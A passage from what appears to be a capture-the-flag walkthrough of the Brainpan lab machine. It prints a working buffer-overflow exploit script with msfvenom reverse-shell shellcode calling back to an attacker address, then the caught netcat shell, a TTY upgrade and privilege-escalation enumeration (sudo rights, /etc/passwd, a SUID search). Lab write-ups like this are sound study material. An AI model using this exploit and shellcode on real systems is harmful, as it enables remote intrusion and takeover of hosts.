
We're modifying our exploit script to use a linux payload instead:
```python
#!/usr/bin/env python3
#2025-01-22

import socket

ip = "10.10.213.158"
port = 9999

allchars = "".join([chr(i) for i in range(256)])  # Generate all characters from \x00 to \xff
badchars = "\x00\x0a"
usechars = "".join(c for c in allchars if c not in badchars) # Remove badchars from allchars
usechars = bytes(usechars, "latin-1")
#print(''.join(f'\\x{ord(c):02x}' for c in usechars))

# msfvenom --payload 'linux/x86/shell_reverse_tcp' LHOST=10.21.31.111 LPORT=444 --format 'python' --bad-chars '\x00'
buf =  b""
buf += b"\xba\x72\xbf\x47\xc5\xda\xd9\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04\x03\x24"
buf += b"\xb1\xa5\x30\xf9\x16\xde\x58\xaa\xeb\x72\xf5\x4e"
buf += b"\x65\x95\xb9\x28\xb8\xd6\x29\xed\xf2\xe8\x80\x8d"
buf += b"\xba\x6f\xe2\xe5\x36\x85\x0b\x9a\x2e\xa7\x33\x65"
buf += b"\x13\x2e\xd2\xd5\x0d\x61\x44\x46\x61\x82\xef\x89"
buf += b"\x48\x05\xbd\x21\x3d\x29\x31\xd9\xa9\x1a\x9a\x7b"
buf += b"\x43\xec\x07\x29\xc0\x67\x26\x7d\xed\xba\x29"

offset = 524
overflow = b"A" * offset
retn = b"\xf3\x12\x17\x31" #311712f3 - pos of JMP ESP
padding = b"\x90" * 16  #space to expand in

#payload = usechars
payload = buf

buffer = overflow + retn + padding + payload + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))

  print("Sending payload...")
  s.send(buffer + b"\r\n") #add \r\n if can't recv data
  print("Done!")
  
except:
  print("Exception: "+str(e))
```

```sh
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 444                                                                                                          
listening on [any] 444 ...
connect to [10.21.31.111] from (UNKNOWN) [10.10.213.158] 45256

ls
checksrv.sh
web

python3 -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ ^Z
zsh: suspended  nc -nvlp 444
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 444

puck@brainpan:/home/puck$ export TERM=xterm

puck@brainpan:/home/puck$ ls -la
total 48
drwx------ 7 puck puck 4096 Mar  6  2013 .
drwxr-xr-x 5 root root 4096 Mar  4  2013 ..
-rw------- 1 puck puck    0 Mar  5  2013 .bash_history
-rw-r--r-- 1 puck puck  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 puck puck 3637 Mar  4  2013 .bashrc
drwx------ 3 puck puck 4096 Mar  4  2013 .cache
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .config
-rw------- 1 puck puck   55 Mar  5  2013 .lesshst
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .local
-rw-r--r-- 1 puck puck  675 Mar  4  2013 .profile
drwxrwxr-x 4 puck puck 4096 Jan 22 11:09 .wine
-rwxr-xr-x 1 root root  513 Mar  6  2013 checksrv.sh
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 web

puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

puck@brainpan:/home/puck$ /home/anansi/bin/anansi_util
bash: /home/anansi/bin/anansi_util: Permission denied

```

We found a root sudo binary but we don't have access to it. We need to be able to access anansi's user directory.

```

puck@brainpan:/home/puck$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:104::/var/run/dbus:/bin/false
reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash

puck@brainpan:/home$ ls -la /etc/passwd
-rw-r--r-- 1 root root 1003 Mar  4  2013 /etc/passwd

puck@brainpan:/home/puck$ id
uid=1002(puck) gid=1002(puck) groups=1002(puck)

puck@brainpan:/home/puck$ cat /etc/os-release
NAME="Ubuntu"
VERSION="12.10, Quantal Quetzal"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu quantal (12.10)"
VERSION_ID="12.10"

puck@brainpan:/home/puck$ env
TERM=xterm
LS_COLORS=
PWD=/home/puck
SHLVL=1
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env

puck@brainpan:/home/puck$ cd ..

puck@brainpan:/home$ ls -la
total 20
drwxr-xr-x  5 root    root    4096 Mar  4  2013 .
drwxr-xr-x 22 root    root    4096 Mar  4  2013 ..
drwx------  4 anansi  anansi  4096 Mar  4  2013 anansi
drwx------  7 puck    puck    4096 Mar  6  2013 puck
drwx------  3 reynard reynard 4096 Mar  4  2013 reynard

puck@brainpan:/home$ find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
-rwsr-xr-x 1 root root 39124 Oct  2  2012 /bin/ping6
-rwsr-xr-x 1 root root 34780 Oct  2  2012 /bin/ping
-rwsr-xr-x 2 root root 115140 Feb 27  2013 /usr/bin/sudo
-rwsr-xr-x 1 root root 60344 Jun 18  2012 /usr/bin/mtr
-rwsr-xr-x 1 root root 30936 Sep  6  2012 /usr/bin/newgrp
-rwsr-xr-x 1 root root 31756 Sep  6  2012 /usr/bin/chsh
-rwsr-xr-x 2 root root 115140 Feb 27  2013 /usr/bin/sudoedit
-rwsr-xr-x 1 root root 40300 Sep  6  2012 /usr/bin/chfn
-rwsr-xr-x 1 root root 14020 Oct  2  2012 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 46576 Jun 11  2012 /usr/bin/at
-rwsr-xr-x 1 root lpadmin 13672 Dec  4  2012 /usr/bin/lppasswd
-rwsr-xr-x 1 root root 41292 Sep  6  2012 /usr/bin/passwd
-rwsr-xr-x 1 root root 57964 Sep  6  2012 /usr/bin/gpasswd
-rwsr-sr-x 1 libuuid libuuid 17996 Sep  6  2012 /usr/sbin/uuidd
-rwsr-xr-- 1 root dip 301944 Sep 26  2012 /usr/sbin/pppd
-rwsr-xr-x 1 anansi anansi 8761 Mar  4  2013 /usr/local/bin/validate
-rwsr-xr-- 1 root messagebus 317564 Oct  3  2012 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 248064 Sep  6  2012 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5452 Jun 25  2012 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 9740 Oct  3  2012 /usr/lib/pt_chown

puck@brainpan:/home$ /usr/local/bin/validate
usage /usr/local/bin/validate <input>

puck@brainpan:/home$ cd puck

puck@brainpan:/home/puck$ /usr/local/bin/validate qwerty
validating input...passed.
```

We found a suid binary owned by anansi. Let's download it (I used nc) and check it out.
